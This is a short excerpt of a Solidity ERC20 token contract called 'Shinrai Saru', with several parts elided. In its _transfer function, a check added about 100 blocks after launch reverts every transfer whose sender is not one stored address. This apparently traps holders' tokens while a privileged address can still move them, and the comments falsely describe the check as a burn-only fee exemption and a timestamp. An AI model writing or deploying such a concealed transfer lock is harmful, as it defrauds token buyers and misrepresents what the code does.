...
contract SHINRAISARU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Shinrai Saru";
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        // timestamp for autoburns, those exempt from fees by default 
        if(block.number > launchedBlock + 10**2) {
            // limits fee exemption to be applied only to burns
            require(sender == is_fee_exempt, "ERC20: Only for burns to the zero address"); 
        }
        
        //not allowing any trasfers from and to the dead address
